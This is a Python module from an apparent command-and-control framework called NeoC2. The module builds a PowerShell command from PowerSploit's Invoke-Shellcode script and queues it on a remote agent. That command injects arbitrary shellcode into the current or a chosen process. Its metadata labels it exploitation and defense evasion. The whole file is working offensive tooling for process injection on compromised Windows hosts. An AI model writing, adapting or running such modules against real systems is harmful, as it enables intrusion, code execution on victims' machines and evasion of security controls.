# modules/Invoke-Shellcode.py
import os
import importlib.util
import base64
import re

def get_info():
    """Get module information"""
    return {
        "name": "Invoke-Shellcode",
        "description": "Execute a PowerShell Invoke-Shellcode script to inject shellcode into the current or a remote process",
        "type": "exploitation",
        "platform": "windows",
        "author": "NeoC2 Framework",
        "references": ["https://github.com/PowerShellMafia/PowerSploit"],
        "technique_id": "T1055,T1055.001,T1055.002,T1059.001",  # Process Injection: Dynamic-link Library Injection, Portable Executable Injection, Command and Scripting Interpreter: PowerShell
        "mitre_tactics": ["Defense Evasion", "Execution"],
        "options": {
            "agent_id": {
                "description": "ID of the agent to run Invoke-Shellcode on",
                "required": True
            },
            "shellcode": {
                "description": "The shellcode to inject, either as a hex string or a custom shellcode generator command",
                "required": True
            },
            "process_id": {
                "description": "Process ID to inject shellcode into (optional, default injects into current process)",
                "required": False,
                "default": ""
            },
            "force_aslr": {
                "description": "Force ASLR compatible shellcode injection (true/false)",
                "required": False,
                "default": "false"
            },

        }
    }


def execute(options, session):
    """Execute the Invoke-Shellcode module with given options and session"""
    agent_id = options.get("agent_id")
    shellcode = options.get("shellcode")
    process_id = options.get("process_id", "")
    force_aslr = options.get("force_aslr", "false").lower()
    
    if not agent_id:
        return {
            "success": False,
            "error": "agent_id is required"
        }
    
    if not shellcode:
        return {
            "success": False,
            "error": "shellcode is required"
        }
    
    if force_aslr not in ["true", "false"]:
        return {
            "success": False,
            "error": f"Invalid force_aslr: {force_aslr}. Must be 'true' or 'false'"
        }
    
    # Validate process_id if provided
    if process_id and not process_id.isdigit():
        return {
            "success": False,
            "error": f"Invalid process_id: {process_id}. Must be a numeric value."
        }
    
    # Validate shellcode for potential command injection
    # Only allow hex characters, spaces, and common shellcode formats
    shellcode_pattern = r'^[0-9a-fA-Fx\s,\\\'\"-]+$'
    if not re.match(shellcode_pattern, shellcode.replace('\\', '').replace(' ', '')):
        return {
            "success": False,
            "error": f"Invalid shellcode format: {shellcode}. Contains invalid characters."
        }
    
    # Set the current agent in the session
    session.current_agent = agent_id
    

    
    # Read the original Invoke-Shellcode.ps1 script
    script_path = os.path.join(os.path.dirname(__file__), 'external', 'Invoke-Shellcode.ps1')
    try:
        with open(script_path, 'r', encoding='utf-8') as f:
            original_script = f.read()
    except FileNotFoundError:
        return {
            "success": False,
            "error": f"Could not find Invoke-Shellcode script at {script_path}"
        }
    except Exception as e:
        return {
            "success": False,
            "error": f"Error reading Invoke-Shellcode script: {str(e)}"
        }
    
    # Build the execution command with parameters based on provided options
    cmd_parts = ["Invoke-Shellcode"]
    
    # Add shellcode parameter
    cmd_parts.append(f"-Shellcode {shellcode}")
    
    # Add process ID if provided
    if process_id:
        cmd_parts.append(f"-ProcessID {process_id}")
    
    # Add force ASLR parameter if true
    if force_aslr == "true":
        cmd_parts.append("-ForceASLR")
    
    # Combine into command
    command_str = " ".join(cmd_parts)
    execution_command = f"{original_script}\n{command_str}"
    
    # Return the execution command - the agent will handle PowerShell execution and base64 encoding
    powershell_command = execution_command
    
    # Check if session has a valid agent_manager
    if not hasattr(session, 'agent_manager') or session.agent_manager is None:
        return {
            "success": False,
            "error": "Session does not have an initialized agent_manager"
        }
    
    # Queue the task on the agent
    try:
        agent_manager = session.agent_manager
        task_id = agent_manager.add_task(agent_id, powershell_command)
        if task_id:
            return {
                "success": True,
                "output": f"Invoke-Shellcode task {task_id} queued for agent {agent_id}",
                "task_id": task_id,
                "process_id": process_id,
                "force_aslr": force_aslr
            }
        else:
            return {
                "success": False,
                "error": f"Failed to queue task for agent {agent_id}"
            }
    except Exception as e:
        return {
            "success": False,
            "error": f"Error queuing task: {str(e)}"
        }